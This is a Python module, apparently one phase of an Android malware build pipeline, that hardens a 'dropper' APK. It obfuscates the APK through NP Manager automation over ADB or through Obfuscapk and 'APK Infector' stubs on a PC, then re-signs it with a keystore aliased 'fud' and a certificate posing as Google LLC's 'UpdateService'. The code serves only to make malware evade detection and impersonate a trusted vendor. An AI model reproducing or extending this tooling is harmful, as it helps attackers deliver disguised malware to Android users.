"""Phase 4: Dropper Hardening — PRIMARY: NP Manager (Android app).

Architecture:
  PRIMARY:  Android NP Manager app — real Dex2C, VM Protection, CF 5.0, etc.
  FALLBACK: PC stubs if no Android device.

PC only:
  - Prepare dropper_embedded.apk
  - File transfer (ADB push/pull)
  - Fallback stubs

Android does:
  - All 11 NP Manager functions on dropper
"""
import os, subprocess, shutil
from config import TEMP_DIR, APKTOOL, ZIPALIGN, KEYTOOL, JARSIGNER, APKSIGNER
from utils.logger import setup_logger

logger = setup_logger()


def _sign_v1v2v3(unsigned_apk, signed_apk, ks_path):
    """Quick sign."""
    if not os.path.exists(ks_path):
        subprocess.run([KEYTOOL, "-genkey", "-v", "-keystore", ks_path,
                        "-keyalg", "RSA", "-keysize", "2048",
                        "-validity", "10000", "-alias", "fud",
                        "-storepass", "fud123", "-keypass", "fud123",
                        "-dname", "CN=UpdateService, OU=Android, O=Google LLC, L=MountainView, C=US",
                        "-storetype", "JKS"],
                       capture_output=True, text=True, timeout=30)
    aligned = str(TEMP_DIR / "phase4_aligned.apk")
    subprocess.run([ZIPALIGN, "-v", "-p", "4", unsigned_apk, aligned],
                   capture_output=True, text=True, timeout=60)
    if not os.path.exists(aligned) or os.path.getsize(aligned) == 0:
        shutil.copy(unsigned_apk, aligned)
    subprocess.run([APKSIGNER, "sign", "--ks", ks_path, "--ks-pass", "pass:fud123",
                    "--key-pass", "pass:fud123", "--ks-key-alias", "fud",
                    "--out", signed_apk, aligned],
                   capture_output=True, text=True, timeout=60)
    if not os.path.exists(signed_apk):
        shutil.copy(aligned, signed_apk)


def _fallback_pc_dropper_hardening(embedded_apk, output_apk):
    """FALLBACK: PC-only dropper hardening when no Android device."""
    logger.info("[*] FALLBACK: PC-only dropper hardening (no Android device)")
    logger.warning("[!] Using Python stubs — real protection not available")

    # Decompile
    decompiled = str(TEMP_DIR / "phase4_fallback_decompiled")
    r = subprocess.run([APKTOOL, "d", "--no-res", "-f", "-o", decompiled, embedded_apk],
                       capture_output=True, text=True, timeout=120)
    if r.returncode != 0:
        logger.warning("[!] Fallback decompile failed, copying as-is")
        shutil.copy(embedded_apk, output_apk)
        return output_apk

    res_dir = os.path.join(decompiled, "res")
    if os.path.exists(res_dir):
        shutil.rmtree(res_dir)

    # Obfuscapk stub
    try:
        from config import OBFUSCAPK_STUB
        subprocess.run(["python3", OBFUSCAPK_STUB, decompiled],
                       capture_output=True, text=True, timeout=300)
        logger.info("[+] Obfuscapk stub done")
    except Exception:
        pass

    # APK Infector stub
    try:
        from config import APK_INFECTOR
        subprocess.run(["python3", APK_INFECTOR, decompiled],
                       capture_output=True, text=True, timeout=120)
        logger.info("[+] APK Infector stub done")
    except Exception:
        pass

    # Dex2C dummy .so
    for arch in ['arm64-v8a', 'armeabi-v7a', 'x86', 'x86_64']:
        lib_dir = os.path.join(decompiled, "lib", arch)
        os.makedirs(lib_dir, exist_ok=True)
        stub = os.path.join(lib_dir, "libdex2c.so")
        with open(stub, 'wb') as f:
            f.write(b'\x7fELF\x01\x01\x01')

    # Rebuild
    unsigned = str(TEMP_DIR / "phase4_fallback_unsigned.apk")
    subprocess.run([APKTOOL, "b", "-o", unsigned, decompiled],
                   capture_output=True, text=True, timeout=180)
    shutil.rmtree(decompiled, ignore_errors=True)
    if not os.path.exists(unsigned) or os.path.getsize(unsigned) == 0:
        shutil.copy(embedded_apk, unsigned)

    # Sign
    ks = str(TEMP_DIR / "phase4_fallback.jks")
    _sign_v1v2v3(unsigned, output_apk, ks)

    logger.info(f"[+] Fallback PC dropper hardening complete: {output_apk}")
    return output_apk


def _android_np_manager_dropper(embedded_apk, output_apk):
    """PRIMARY: Use REAL NP Manager on Android device for dropper."""
    logger.info("[*] PRIMARY: Real NP Manager on Android (dropper)")

    try:
        from android_automation.np_manager_automation import run_np_manager_11
        from android_automation.adb_ui import is_device_connected

        if not is_device_connected():
            logger.info("[!] No Android device connected")
            return None

        success = run_np_manager_11(embedded_apk, output_apk)
        if success and os.path.exists(output_apk) and os.path.getsize(output_apk) > 0:
            logger.info(f"[+] REAL NP Manager dropper complete: {output_apk}")
            return output_apk
        else:
            logger.warning("[!] NP Manager dropper automation failed")
            return None

    except Exception as e:
        logger.warning(f"[!] NP Manager dropper automation error: {e}")
        return None


def run(embedded_dropper_apk):
    """Phase 4: Dropper Hardening — NP Manager PRIMARY.

    Flow:
      1. Try REAL NP Manager on Android → if success, return
      2. If no Android or failure → FALLBACK PC stubs
    """
    logger.info("=" * 60)
    logger.info("[*] PHASE 4: Dropper Hardening (NP Manager PRIMARY)")
    logger.info("=" * 60)

    output_apk = str(TEMP_DIR / "dropper_hardened.apk")

    # PRIMARY: Real NP Manager on Android
    android_result = _android_np_manager_dropper(embedded_dropper_apk, output_apk)
    if android_result:
        logger.info(f"[+] Phase 4 (ANDROID) Complete: {output_apk}")
        return output_apk

    # FALLBACK: PC stubs
    logger.info("[*] Switching to PC fallback mode...")
    _fallback_pc_dropper_hardening(embedded_dropper_apk, output_apk)
    logger.info(f"[+] Phase 4 (PC FALLBACK) Complete: {output_apk}")
    return output_apk
